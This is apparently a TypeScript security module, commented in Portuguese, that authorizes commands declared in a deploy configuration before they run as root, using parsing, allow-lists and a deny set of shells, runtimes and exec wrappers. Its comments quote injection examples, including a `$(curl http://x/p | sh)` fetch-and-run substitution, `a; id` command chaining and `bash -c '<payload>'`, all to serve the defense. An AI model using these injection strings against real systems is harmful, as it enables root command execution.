// story-ex0067 — A RÉGUA DOS COMANDOS DECLARADOS EM BOARD-DATA: o que pode ser EXECUTADO pelo passo
// privilegiado do deploy. UM módulo, UMA régua, TRÊS campos.
//
// POR QUE ELE EXISTE COMO ARQUIVO PRÓPRIO (e não dentro de deploy.ts, onde nasceu): o `board.yaml` tem
// TRÊS campos que terminam virando comando executado como root — `deploy.surfaces[].deployCmd`,
// `deploy.command` (kind=command) e `deploy.canaryCommand` — e eles são executados por DOIS módulos
// diferentes (`runner/deploy.ts` e `runner/face-probe.ts`). As duas ondas anteriores cobriram só os dois
// primeiros, porque a régua morava no módulo do deploy e o do canário NÃO PODE importá-lo: `deploy.ts`
// importa `product-deploy.ts`, que lê um manifesto do disco em TEMPO DE CARGA (foi essa mina que forçou o
// split do `face-probe.ts` — ver o cabeçalho dele). O resultado é que o terceiro campo chegava a
// `/bin/sh -c` como STRING CRUA e contornava as duas ondas por inteiro: bastava escrever o payload no
// campo vizinho do MESMO bloco `deploy:`. Este módulo é PURO e sem NENHUM import justamente para que os
// dois executores possam depender dele — a régua deixa de ser propriedade de um caminho.
//
// O QUARTO CAMPO (preflight de frescor): `deploy.liveShaCommand`, o comando que diz qual sha está no ar, é
// executado por um TERCEIRO módulo (`runner/deploy-freshness.ts`) — e passa por esta mesma régua, sem cópia.
// O censo em `deploy-command-guard.test.ts` foi o que obrigou o registro: um campo com cara de comando no
// contrato reprova lá até alguém decidir quem o executa e por qual régua.
//
// O QUE ELE IMPEDE: que uma linha de CONFIGURAÇÃO vire execução arbitrária como root. Board-data
// (`storymap/boards/**`) é editado por humanos E por agentes e é a ÚNICA classe de caminho que o gate de
// código NÃO examina por desenho (`classifyDeltaPath`, release.ts: `board-data` é auto-skip; a
// `storymap/settings.yaml` é `control`, e por isso É gateada). Logo: comando declarado em board-data passa
// pela régua; comando do canal do OPERADOR (settings.yaml / env do serviço) não precisa dela — ele já é
// superfície de revisão.
//
// O QUE ELE NÃO FAZ: reduzir autonomia. Não há aprovação humana em lugar nenhum, o self-deploy segue
// automático, e o dono que publica com outro lançador/receita DECLARA as allow-lists no `storymap/settings.yaml` do
// alvo (`deploy.launchers` / `deploy.recipeRunners` / `deploy.recipes`) ou no env do SERVIÇO (systemd) — canais que
// board-data não alcança. O que board-data perde é só o poder de ESCOLHER qualquer programa/receita.
//
// SEM DEFAULT NO CÓDIGO (lote D): as três listas nasceram com o ferramental do repositório onde a ferramenta foi
// escrita (um task runner, dois CLIs de publicação, o nome de uma receita). Isso era uma suposição escondida — num
// alvo que publica de outro jeito, o comando dele seria recusado por uma lista que ele nunca viu, ou, pior, um
// lançador que ele não usa ficaria autorizado. Agora o padrão é VAZIO e a política é SEMPRE passada de fora
// ({@link DeployCommandPolicy}, obrigatória: um chamador novo que a esqueça não compila). Vazio recusa dizendo a chave a
// declarar, nunca supõe.

/** POSIX single-quote a string para embutir como UM argumento de shell — o shell externo nunca expande o
 *  `$VAR`/`$(…)` de dentro. Escapa a aspa simples pelo idioma '\''. */
export function shSingleQuote(s: string): string {
  return `'${s.replace(/'/g, `'\\''`)}'`;
}

/** A argv AUTORIZADA como UMA string pronta para um shell: palavra por palavra citada, nada expansível. */
export function quoteArgv(argv: readonly string[]): string {
  return argv.map(shSingleQuote).join(" ");
}

/**
 * Os METACARACTERES que só têm sentido para um SHELL. A presença de qualquer um deles fora de aspas
 * significa que a string declarada não é um comando, é um SCRIPT — e um script declarado em board-data
 * (editado por humanos E por agentes, e que não passa por gate de código) não roda como root.
 * `\\` entra na lista porque escape é sintaxe de shell: sem shell, não há o que escapar.
 */
const SHELL_METACHARS = /[;&|$`(){}[\]<>*?!~#\\\n\r]/;

/**
 * PURA: a string DECLARADA fatiada em PALAVRAS, ou `null` quando ela não pode ser expressa sem um shell
 * interpretando-a.
 *
 * Isto é SÓ O PARSER: passar por aqui prova apenas que a declaração é uma lista de palavras — NÃO prova
 * que essas palavras podem ser executadas como root. `bash -c '<payload>'` é uma lista de palavras
 * impecável. Quem decide o que pode ser EXECUTADO é {@link authorizeDeployCommand}, e é ela — não esta
 * função — que os TRÊS caminhos privilegiados chamam.
 *
 * Aceita: palavras separadas por espaço, com `'…'`/`"…"` agrupando literalmente (dentro das aspas um
 * metacaractere é literal nos DOIS mundos, então não muda o que será executado). RECUSA (fail-closed,
 * devolve `null`): aspas não fechadas, string vazia, e qualquer {@link SHELL_METACHARS} fora de aspas —
 * recusar é honesto, porque sem shell não há como HONRAR `;`/`|`/`$(…)`, e executar "quase" o que foi
 * declarado é pior que não executar.
 */
export function parseDeclaredArgv(cmd: string): string[] | null {
  const argv: string[] = [];
  let current = "";
  let started = false; // distingue `''` (palavra vazia legítima) de "nada ainda"
  let quote: '"' | "'" | null = null;
  for (const ch of cmd) {
    if (quote) {
      if (ch === quote) quote = null;
      else current += ch;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      started = true;
      continue;
    }
    // A ORDEM importa: o teste de metacaractere vem ANTES do de espaço porque `\n`/`\r` são AS DUAS
    // coisas. Tratá-los como separador (o que a ordem inversa fazia) transformava um comando de duas
    // LINHAS — que só pode ter sido escrito querendo dois comandos — num único comando com argumentos a
    // mais, silenciosamente. Sem shell isso não é executável de qualquer forma: melhor recusar e dizer.
    if (SHELL_METACHARS.test(ch)) return null; // sintaxe de shell fora de aspas → não é argv
    if (/\s/.test(ch)) {
      if (started) argv.push(current);
      current = "";
      started = false;
      continue;
    }
    current += ch;
    started = true;
  }
  if (quote) return null; // aspas abertas: o dono quis dizer algo que não sabemos ler
  if (started) argv.push(current);
  return argv.length > 0 ? argv : null;
}

/*
 * A ALLOW-LIST dos LANÇADORES de deploy: os únicos programas que uma declaração de board-data pode pôr
 * em `argv[0]`. Ela vem do alvo (`settings.yaml` → `deploy.launchers`, mais o env do serviço) e NÃO tem default.
 *
 * POR QUE ALLOW-LIST, e não uma régua de caracteres nem uma lista de proibidos: a 1ª passada olhava
 * METACARACTERE fora de aspas, e isso não impedia nada — o atacante não precisa de `;`/`|`, basta declarar
 * um INTERPRETADOR como alvo e pôr o payload dentro de aspas (`bash -c '…'`, `sh -c`, `node -e`,
 * `python3 -c`, `env FOO=1 bash …`, `/bin/sh -c`). Enumerar interpretadores seria uma lista infinita (todo
 * shell, todo runtime, todo wrapper de exec: `env`, `xargs`, `nice`, `find -exec`…), então a régua é
 * invertida: só o que está NOMEADO na política é executável, e todo o resto é recusado com motivo.
 *
 * Nenhuma capacidade do dono é tirada: quem publica com outro CLI o declara. O que muda é QUEM sabe qual CLI é
 * esse — o alvo, não o código da ferramenta.
 */

/*
 * Lançadores cuja RECEITA mora num arquivo (o arquivo de tarefas da raiz do repo, versionado e sob gate de
 * código) e que a EXPANDEM COMO TEXTO dentro de uma linha de shell. São a razão de existirem as réguas de
 * receitas e {@link RECIPE_ARG_WORD}: num task runner o argumento não termina em `argv` —
 * ele é INTERPOLADO na receita e o shell do runner lê o resultado.
 *
 * Para eles NENHUM argumento pode começar por `-`: opções de arquivo/diretório de trabalho apontariam a
 * receita para FORA do repositório, devolvendo ao dado declarado o poder de escolher o que roda. Receita e
 * parâmetro são posicionais, então a régua não custa capacidade nenhuma.
 *
 * ⚠ LIMITE DECLARADO: um lançador só responde à régua da cadeia receita→argumento se o operador o declarar em
 * `deploy.recipeRunners` (ou `AGILEHARNESS_DEPLOY_RECIPE_RUNNERS`). A ferramenta NÃO adivinha qual lançador é task
 * runner: um lançador comum (`pulumi up --yes`) morreria na régua de opção sem knob nenhum para sair do beco.
 */

/*
 * A allow-list das RECEITAS de deploy: o alvo SECUNDÁRIO, que num task runner é quem escolhe QUAL linha de
 * shell vai receber os argumentos. Vem de `deploy.recipes` (mais o env) e NÃO tem default.
 *
 * O que isto IMPEDE: que um lançador autorizado seja usado como PORTA para uma receita que interpola
 * argumento em comando de shell. Medido com um task runner de receitas: ele NÃO passa parâmetro como argv — ele o
 * cola COMO TEXTO na linha da receita, que então vai para um shell. Uma receita `ping-url url:` cujo corpo é
 * `node tools/ping.js --url {{url}}` mostra a cadeia inteira: `<runner> ping-url '$(curl http://x/p | sh)'` vira
 * `node tools/ping.js --url $(curl http://x/p | sh)`, e uma receita `archive id board:` com corpo
 * `bun tools/archive.ts {{id}} {{board}}` transforma `<runner> archive 'a; id' loja` em `bun tools/archive.ts a; id loja`.
 * Alvo autorizado, payload no ARGUMENTO, execução com o privilégio do serviço a partir de uma linha de board-data
 * que não passa por gate de código.
 *
 * POR QUE ALLOW-LIST da receita, e não só saneamento de argumento: são réguas ORTOGONAIS e ambas
 * necessárias. O saneamento ({@link RECIPE_ARG_WORD}) protege a receita que HOJE interpola; a allow-list
 * protege da receita que amanhã VAI interpolar — o arquivo de tarefas cresce sem passar por este arquivo, e as receitas
 * parametrizadas de um repositório raramente foram escritas pensando em receber dado hostil. Fixar o conjunto
 * ALCANÇÁVEL é o que fecha por DESENHO em vez de por acidente.
 *
 * E não há lista de receitas PROIBIDAS porque não é preciso: a receita mora num arquivo versionado, que é
 * superfície de revisão; o que board-data perde é o poder de ESCOLHER qual delas roda.
 */

/**
 * A FORMA de um argumento que vai para um task runner ({@link DeployCommandPolicy.recipeRunners}): uma PALAVRA literal, validada por
 * allow-list de caracteres.
 *
 * O que isto IMPEDE: que o argumento vire SINTAXE na linha de shell da receita. Como o task runner
 * interpola o parâmetro SEM citar, todo byte com significado para o shell é executável ali — não só
 * `$(`/`` ` ``/`${` (substituição de comando e expansão), mas também `;`/`|`/`&` (encadear outro comando),
 * `>`/`<` (redirecionar), `*`/`?` (glob), `\` (escape) e até o ESPAÇO (um argumento vira dois). Por isso a
 * régua é uma allow-list de caracteres e não uma lista de proibidos: proibido esquecido é buraco.
 *
 * Ela NÃO vale para lançador que não é task runner (`vercel`, `flyctl`, um CLI do env): ali o argumento
 * chega como `argv` de um programa — não existe segundo shell relendo-o —, e a re-citação palavra-por-palavra
 * ({@link quoteArgv}) já é o controle completo. Apertar lá tiraria capacidade sem fechar nada.
 *
 * O charset cobre o que um parâmetro de deploy real é: nome, caminho, URL, chave=valor, lista com vírgula.
 */
const RECIPE_ARG_WORD = /^[A-Za-z0-9][A-Za-z0-9._:,=+@/-]*$/;

/**
 * A FORMA de um NOME DE RECEITA, como o próprio task runner a aceita (medido: `just` 1.51 resolve
 * `[A-Za-z_][A-Za-z0-9_-]*` e recusa qualquer outra coisa com "justfile does not contain recipe").
 *
 * É a régua que resolve a AMBIGUIDADE DE POSIÇÃO — e ela é o coração da 3ª passada. `just` roda VÁRIAS
 * receitas por invocação e reparte os argumentos por ARIDADE, que só o `justfile` conhece: medido,
 * `just a b c` = receita `a` + receita `b` recebendo `c`, e `just a c` = receita `a` + receita `c`. Como o
 * harness não sabe a aridade de ninguém, ele não pode dizer qual posição é parâmetro e qual é uma SEGUNDA
 * receita — então TODA palavra com esta forma é tratada como posição de receita e tem de estar na
 * allow-list. Sem isso, `just <receita-autorizada> wipe-all` passava: receita autorizada na primeira
 * posição, `justfile` inteiro alcançável na segunda (uma receita de aridade 0 faz TUDO
 * depois dela ser outra receita).
 *
 * Uma palavra que NÃO tem esta forma (URL, caminho, `1.2.3`, `k=v`) não pode ser nome de receita nenhum,
 * então é parâmetro por eliminação e responde só à {@link RECIPE_ARG_WORD}.
 */
const RECIPE_NAME_SHAPE = /^[A-Za-z_][A-Za-z0-9_-]*$/;

/** Env do SERVIÇO (systemd) pelo qual o operador ESTENDE `deploy.launchers`. Nomes separados por espaço/vírgula. */
const DEPLOY_LAUNCHERS_ENV = "AGILEHARNESS_DEPLOY_LAUNCHERS";

/** Env do SERVIÇO pelo qual o operador ESTENDE `deploy.recipes`. Nomes separados por espaço/vírgula. */
const DEPLOY_RECIPES_ENV = "AGILEHARNESS_DEPLOY_RECIPES";

/** Env do SERVIÇO pelo qual o operador ESTENDE `deploy.recipeRunners`: declara que um lançador É um task runner (e
 *  portanto responde à cadeia receita→argumento). */
const RECIPE_RUNNERS_ENV = "AGILEHARNESS_DEPLOY_RECIPE_RUNNERS";

/**
 * O que NUNCA é alvo de deploy, nem quando o operador escreve no env. A allow-list já fecha o caminho de
 * board-data; esta lista impede que o KNOB reabra o buraco por engano — um `AGILEHARNESS_DEPLOY_LAUNCHERS=bash`
 * transformaria a régua em decoração. Ela NÃO é a régua (lista de proibidos nunca é): é a trava do knob.
 */
export const NEVER_A_DEPLOY_TARGET: ReadonlySet<string> = new Set([
  // shells
  "bash", "sh", "dash", "zsh", "ksh", "fish", "csh", "tcsh", "busybox",
  // runtimes que executam código vindo de argumento (`-e`/`-c`)
  "node", "bun", "deno", "python", "python2", "python3", "perl", "ruby", "php", "lua", "osascript", "powershell", "pwsh",
  // wrappers que executam OUTRO programa recebido por argumento
  "env", "xargs", "nice", "nohup", "timeout", "stdbuf", "setsid", "time", "watch", "parallel",
  // elevação / execução remota / execução em outro namespace
  "sudo", "doas", "su", "ssh", "sshpass", "systemd-run", "systemctl", "nsenter", "chroot", "unshare", "docker", "podman", "kubectl",
  // utilitários com execução embutida
  "awk", "gawk", "sed", "find", "eval", "exec", "command", "source", "make",
]);

/**
 * Os task runners CONHECIDOS — só para o LINT de {@link taskRunnersMissingFromRecipeRunners}. NÃO é allow-list nem default: a
 * ferramenta continua sem supor qual lançador o alvo usa (a lista de lançadores é só a que o operador declara). Serve a UM
 * aviso: um lançador declarado que é task runner e NÃO está em `recipeRunners` recebe a régua de lançador comum e perde a
 * da cadeia receita→argumento — o que dá a um dado de board (editável por agente) a interpolação de texto numa linha de
 * shell do runner, com o privilégio do serviço. É um erro fácil (declarar `launchers` e esquecer `recipeRunners`) e
 * silencioso, por isso vira aviso alto, não suposição.
 */
export const KNOWN_TASK_RUNNERS: ReadonlySet<string> = new Set(["just", "task", "mise", "rake", "mask"]);

/** Os lançadores efetivos que são task runners CONHECIDOS e não respondem à régua da cadeia (fora de `recipeRunners`). PURA. */
export function taskRunnersMissingFromRecipeRunners(policy: Pick<DeployCommandPolicy, "launchers" | "recipeRunners">): string[] {
  return policy.launchers.filter((l) => KNOWN_TASK_RUNNERS.has(l) && !policy.recipeRunners.has(l));
}

/** Os nomes declarados num knob de env: separados por espaço/vírgula, vazios descartados. PURA. */
function envNames(raw: string | undefined): string[] {
  return (raw ?? "")
    .split(/[\s,]+/)
    .map((s) => s.trim())
    .filter((s) => s.length > 0);
}

/** Une as três fontes de uma lista de nomes — o que o `settings.yaml` do alvo declarou ∪ o env do serviço —, sem repetição. */
function unionNames(declared: readonly string[] | undefined, fromEnv: readonly string[]): string[] {
  return [...new Set([...(declared ?? []), ...fromEnv])];
}

/**
 * PURA sobre o env recebido: a allow-list efetiva de lançadores = o que o alvo declarou (`deploy.launchers`,
 * `declared`) ∪ o que o operador pôs em `AGILEHARNESS_DEPLOY_LAUNCHERS`. NÃO HÁ DEFAULT: sem declaração nenhuma a lista é
 * VAZIA e a régua recusa tudo dizendo a chave a declarar. O env só ACRESCENTA (nunca remove o que o settings declarou);
 * um nome com `/` é ignorado (alvo é NOME, não caminho) e um {@link NEVER_A_DEPLOY_TARGET} é ignorado venha de onde vier —
 * inclusive do settings, porque um `launchers: [bash]` por engano reabriria o buraco que a allow-list fecha.
 *
 * ⚠ Se o lançador adicionado for um TASK RUNNER, declare-o também em `deploy.recipeRunners`
 * — senão ele recebe a régua de lançador e NÃO a da cadeia receita→argumento.
 */
export function resolveDeployLaunchers(
  env: Record<string, string | undefined> = process.env,
  declared?: readonly string[],
): readonly string[] {
  return unionNames(declared, envNames(env[DEPLOY_LAUNCHERS_ENV])).filter((s) => !s.includes("/") && !NEVER_A_DEPLOY_TARGET.has(s));
}

/**
 * PURA sobre o env recebido: as receitas alcançáveis = `deploy.recipes` (`declared`) ∪ `AGILEHARNESS_DEPLOY_RECIPES`. Sem
 * default. Um nome que não tem a FORMA de nome de receita ({@link RECIPE_NAME_SHAPE})
 * é ignorado — o task runner não conseguiria resolvê-lo de qualquer forma, e aceitá-lo aqui só daria ao knob
 * a aparência de liberar algo. (A régua anterior usava a forma de ARGUMENTO, mais larga: ela aceitava
 * `a/b`, `a.b` e `k=v` como "receita" enquanto o doc-comment afirmava que `/`, espaço e `$` eram ignorados.)
 *
 * O que o operador declara aqui são NOMES ALCANÇÁVEIS EM POSIÇÃO DE RECEITA — e como o task runner reparte
 * argumentos por aridade, um PARÂMETRO em forma de palavra-nome (`prod`, `loja`) também precisa estar
 * nesta lista. Não é preciosismo: é a única leitura sound sem parsear o arquivo de receitas.
 */
export function resolveDeployRecipes(
  env: Record<string, string | undefined> = process.env,
  declared?: readonly string[],
): readonly string[] {
  return unionNames(declared, envNames(env[DEPLOY_RECIPES_ENV])).filter((s) => RECIPE_NAME_SHAPE.test(s));
}

/**
 * PURA sobre o env recebido: os lançadores que respondem à cadeia receita→argumento = `deploy.recipeRunners`
 * (`declared`) ∪ `AGILEHARNESS_DEPLOY_RECIPE_RUNNERS`. Sem default. Um nome que não é lançador é inócuo (a régua
 * da cadeia só é consultada depois de o alvo passar pela allow-list de lançadores).
 */
export function resolveRecipeRunners(
  env: Record<string, string | undefined> = process.env,
  declared?: readonly string[],
): ReadonlySet<string> {
  return new Set(unionNames(declared, envNames(env[RECIPE_RUNNERS_ENV])).filter((s) => RECIPE_NAME_SHAPE.test(s)));
}

/**
 * A POLÍTICA do passo privilegiado: o que um comando declarado em board-data pode EXECUTAR. Ela é OBRIGATÓRIA em
 * {@link authorizeDeployCommand} (sem default no código — ver o cabeçalho) e se monta com {@link deployPolicyFromSettings}.
 */
export interface DeployCommandPolicy {
  /** os programas que podem ficar em `argv[0]` */
  launchers: readonly string[];
  /** as receitas alcançáveis em posição de receita, num task runner */
  recipes: readonly string[];
  /** os lançadores que são task runners (respondem à cadeia receita→argumento) */
  recipeRunners: ReadonlySet<string>;
}

/** O que a política lê do bloco `deploy:` do settings (estrutural: este módulo não importa tipos nenhum). */
export interface DeployCommandPolicySource {
  launchers?: readonly string[];
  recipes?: readonly string[];
  recipeRunners?: readonly string[];
}

/**
 * PURA: monta a política efetiva = `settings.yaml → deploy.{launchers,recipes,recipeRunners}` ∪ o env do serviço. O `declared` é o
 * bloco `deploy` já peneirado pelo carregador de config (ou a política resolvida dele); ausente ⇒ só o env ⇒, num
 * serviço sem env, TUDO VAZIO (nenhum comando de board-data roda no passo privilegiado).
 */
export function deployPolicyFromSettings(
  declared: DeployCommandPolicySource | null | undefined,
  env: Record<string, string | undefined> = process.env,
): DeployCommandPolicy {
  return {
    launchers: resolveDeployLaunchers(env, declared?.launchers),
    recipes: resolveDeployRecipes(env, declared?.recipes),
    recipeRunners: resolveRecipeRunners(env, declared?.recipeRunners),
  };
}

/** Veredito da régua: a argv AUTORIZADA, ou o motivo NOMEADO da recusa (nunca os dois). */
export interface DeployCommandVerdict {
  /** as palavras a executar como argumentos posicionais; `null` quando recusado */
  argv: string[] | null;
  /** motivo nomeado — vai para o log do unit, para o `reason` do resultado e para o aviso do operador */
  refusal: string | null;
}

/**
 * Caractere de controle num argumento quebraria a LINHA de auditoria (o rastro do que rodou como root).
 *
 * O conjunto é C0 + DEL + **C1** (U+0080–U+009F). O C1 não é preciosismo: U+0085 é NEL, que terminal e leitor
 * de log em UTF-8 tratam como QUEBRA DE LINHA, e U+009B é o introdutor de sequência de controle. Sem eles, um
 * comando declarado em board-data podia FORJAR uma segunda linha `[postBuild] argv: …` — a linha que existe
 * justamente para dizer o que rodou como root deixava de ser evidência. Não custa capacidade: argumento de
 * deploy real (nome, caminho, URL, mensagem humana) não tem caractere de controle de nenhuma das faixas.
 */
const hasControlChar = (word: string): boolean =>
  [...word].some((ch) => {
    const code = ch.codePointAt(0) ?? 0;
    return code < 0x20 || code === 0x7f || (code >= 0x80 && code <= 0x9f);
  });

/**
 * A RÉGUA do passo privilegiado: o que pode ser EXECUTADO (não quais caracteres aparecem). Fail-closed nos
 * TRÊS caminhos declarados em board-data — `deploy.surfaces[].deployCmd`, `deploy.kind=command` e
 * `deploy.canaryCommand`.
 *
 * Ordem das recusas, todas NOMEADAS (recusa muda é indistinguível de bug):
 *  1. não é lista de palavras ({@link parseDeclaredArgv}) — precisaria de um shell para ser honrada;
 *  2. argumento com caractere de controle — some com o rastro de auditoria e não existe em deploy real;
 *  3. alvo com `/` — alvo é NOME resolvido pelo PATH do operador, nunca um arquivo que o dado escolheu
 *     (é o que impede `'/bin/sh' '-c' '<payload>'`, que passa pelo parser inteiro);
 *  4. alvo fora de `policy.launchers` — aqui morrem TODOS os interpretadores, sem enumerá-los (e, sem política
 *     declarada, TODO comando: a recusa diz a chave a declarar);
 *  5. opção num task runner (`policy.recipeRunners`) — uma opção de arquivo de receitas apontaria a receita para fora do repositório;
 *  6. num task runner, QUALQUER posição que possa ser receita ({@link RECIPE_NAME_SHAPE}) fora da
 *     `policy.recipes` — um task runner roda várias receitas por invocação e reparte argumentos por aridade,
 *     que o harness não conhece; validar só `argv[1]` deixava o `justfile` inteiro alcançável;
 *  7. argumento de task runner que não é PALAVRA ({@link RECIPE_ARG_WORD}) — o runner o interpola SEM citar,
 *     então `;`/`|`/`$(…)`/`` ` ``/`>` ali são sintaxe executada como root, mesmo tendo vindo dentro de aspas.
 * Passando as sete, as palavras viram argumentos POSICIONAIS de um script fixo (`exec "$@"`) ou uma argv
 * re-citada ({@link quoteArgv}): shell nenhum as re-interpreta.
 */
export function authorizeDeployCommand(cmd: string, policy: DeployCommandPolicy): DeployCommandVerdict {
  const launchers = policy.launchers;
  const argv = parseDeclaredArgv(cmd);
  if (!argv) {
    return {
      argv: null,
      refusal:
        "sintaxe de SHELL fora de aspas (`;` `|` `&&` `$(...)` redireção), aspas não fechadas ou declaração " +
        "vazia — a string precisaria de um shell para ser interpretada, e o passo privilegiado do deploy não " +
        "tem shell lendo dado declarado",
    };
  }
  if (argv.some(hasControlChar)) {
    return { argv: null, refusal: "argumento com caractere de controle — a linha de auditoria do que roda como root tem de ser legível" };
  }
  const [target, ...args] = argv;
  if (target.includes("/")) {
    return {
      argv: null,
      refusal:
        `alvo com caminho (${target}) — o alvo tem de ser o NOME de um lançador da allow-list ` +
        `(${launchers.join(", ") || "nenhum declarado"}), nunca um arquivo escolhido pelo dado declarado`,
    };
  }
  if (!launchers.includes(target)) {
    return {
      argv: null,
      refusal:
        `alvo ${target} fora da allow-list de lançadores de deploy (${launchers.join(", ") || "nenhum declarado"}) — ` +
        `interpretador (bash, sh, node, python, env, xargs) NUNCA é alvo válido. Declare o lançador do repositório em ` +
        `settings.yaml → deploy.launchers (ou no env ${DEPLOY_LAUNCHERS_ENV} do serviço), ou use kind: agent`,
    };
  }
  const recipeRunners = policy.recipeRunners;
  if (recipeRunners.has(target)) {
    const option = args.find((a) => a.startsWith("-"));
    if (option) {
      return {
        argv: null,
        refusal:
          `opção ${option} no task runner ${target} — só nome de receita e parâmetro posicional são aceitos ` +
          `(--justfile, -f e --working-directory apontariam a receita para fora do repositório)`,
      };
    }
    const recipes = policy.recipes;
    const recipesTxt = recipes.join(", ") || "nenhuma declarada";
    const declareRecipe = `Declare a receita em settings.yaml → deploy.recipes (ou no env ${DEPLOY_RECIPES_ENV} do serviço)`;
    if (args.length === 0) {
      return {
        argv: null,
        refusal:
          `${target} sem receita — o task runner sozinho roda a receita DEFAULT do arquivo de receitas, que não é um ` +
          `passo de publicação declarado. Nomeie a receita (${recipesTxt})`,
      };
    }
    // A CADEIA INTEIRA, POSIÇÃO POR POSIÇÃO — não só `argv[1]`. A primeira posição É uma receita por
    // construção; as seguintes são AMBÍGUAS, porque o task runner reparte os argumentos pela ARIDADE das
    // receitas, que mora no `justfile` e não aqui (medido: `just a c` roda `a` e `c`). Tratar a ambiguidade
    // como "parâmetro" era o buraco: um `deployCmd` de aridade 0 faz tudo
    // depois dele ser OUTRA receita — `wipe-all`, `archive`, o justfile inteiro,
    // alcançável de board-data com o doc-comment afirmando que a allow-list de receitas fechava isso.
    for (const [i, arg] of args.entries()) {
      const looksLikeRecipe = RECIPE_NAME_SHAPE.test(arg);
      if (i === 0 && !looksLikeRecipe) {
        // A posição 0 tem de ter FORMA de nome de receita, e é aqui que morre a ATRIBUIÇÃO DE VARIÁVEL:
        // medido, `just VAR='$(id)' receita` sobrescreve uma variável do justfile e o valor é INTERPOLADO na
        // linha da receita (`echo A $(id)`) — execução como root por um terceiro caminho. Atribuição só é
        // reconhecida ANTES da 1ª receita e `k=v` não tem forma de nome: exigir a forma aqui fecha o vetor.
        return {
          argv: null,
          refusal:
            `receita ${arg} fora da allow-list de receitas de deploy (${recipesTxt}) — no ${target} a ` +
            `posição da receita não aceita nem parâmetro nem ATRIBUIÇÃO (VAR=…, que reescreveria a própria ` +
            `linha da receita). ${declareRecipe}`,
        };
      }
      if (looksLikeRecipe && !recipes.includes(arg)) {
        return {
          argv: null,
          refusal:
            i === 0
              ? `receita ${arg} fora da allow-list de receitas de deploy (${recipesTxt}) — o ${target} ` +
                `interpola parâmetro COMO TEXTO na linha de shell da receita, então uma receita parametrizada ` +
                `qualquer (canary-check, advance-card, api-extract…) executa o argumento como root. ${declareRecipe}`
              : `receita ${arg} fora da allow-list de receitas de deploy (${recipesTxt}): a palavra na ` +
                `posição ${i + 1} tem forma de NOME DE RECEITA, e o ${target} roda VÁRIAS receitas por invocação, ` +
                `repartindo os argumentos pela aridade de cada uma — aridade que só o arquivo de receitas conhece. Nesta ` +
                `posição a palavra pode ser uma SEGUNDA receita (e a primeira, real, tem aridade 0), então o ` +
                `arquivo de receitas inteiro ficaria alcançável de board-data. ${declareRecipe}, ` +
                `ou passe um parâmetro sem forma de nome de receita (URL, caminho, chave=valor)`,
        };
      }
      if (!looksLikeRecipe && !RECIPE_ARG_WORD.test(arg)) {
        return {
          argv: null,
          refusal:
            `argumento ${JSON.stringify(arg)} da receita ${args[0]} não é uma palavra literal — o ${target} o ` +
            `interpola SEM citar na linha de shell da receita, então substituição de comando, backtick, ` +
            `\`;\`, \`|\`, \`>\` e até espaço ali viram sintaxe executada como root (aspas na declaração não ` +
            `protegem: elas morrem no parser)`,
        };
      }
    }
  }
  return { argv, refusal: null };
}
